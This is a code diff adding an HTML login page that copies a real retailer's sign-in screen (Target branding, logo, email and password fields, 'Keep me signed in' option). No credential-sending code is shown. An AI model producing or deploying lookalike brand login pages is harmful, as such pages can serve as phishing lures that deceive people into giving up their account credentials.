@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Target Login</title>
+    <style>
+        html,
+        body {
+            display: flex;
+            justify-content: center;
+            font-family: Roboto, Arial, sans-serif;
+            font-size: 15px;
+        }
+
+        form {
+            /* border: 5px solid #a70d0d; */
+            width: 50%;
+
+        }
+
+        input[type=text],
+        input[type=password] {
+            width: 100%;
+            padding: 16px 8px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid rgb(30, 29, 29);
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #cd0e0e;
+            color: white;
+            padding: 14px 0;
+            margin: 10px 0;
+            border: none;
+            cursor: grabbing;
+            width: 100%;
+            border-radius: 6px;
+        }
+
+        h1 {
+            text-align: center;
+            font: size 23 px;
+            font-weight: bold;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        .formcontainer {
+            text-align: left;
+            margin: 24px 50px 12px;
+        }
+
+        .container {
+            padding: 16px 0;
+            text-align: left;
+        }
+
+        span.psw {
+            float: left;
+            padding-top: 0;
+            padding-right: 15px;
+        }
+    </style>
+    <link href="./login/login.css" rel="stylesheet">
+    <script src="/login/login.js">
+    </script>
+    
+</head>
+
+<body>
+    <div id="fillData"></div>
+
+    <form>
+        <div style="display: flex;justify-content:center; padding-top:10px ;"> <img src="/image/logo.jpg" alt="" height="42px"
+                width="42px"></div>
+        <h1>Sign into your Target account</h1>
+        <div class="formcontainer">
+            <div class="container">
+                <input type="text" placeholder="Email or mobile phone" name="uname" required>
+                <input type="password" placeholder="Password" name="psw" required>
+
+            </div>
+            <div style="display: flex; gap:10px">
+                <div><input type="checkbox" checked="checked" name="remember"> </div>
+                <div>
+                    <div>Keep me signed in</div>
+                    <label style="color: rgb(102, 102, 102);;">By checking this box you won't have to sign in as often
+                        on this device. For your security,
+                        we recommend only checking this box on your personal devices. </label>
+                </div>
+            </div>
+            <button id="signIn">Sign in</button>
+            <div style="display: flex; justify-content: center;"><span class="psw"><a href="#"> Forgot
+                        password?</a></span></div>
+            <button type="submit" style="background-color: white;color:black;border: 1px solid;">Create your Target
+                account</button>
+    </form>
+</body>
+
+</html>
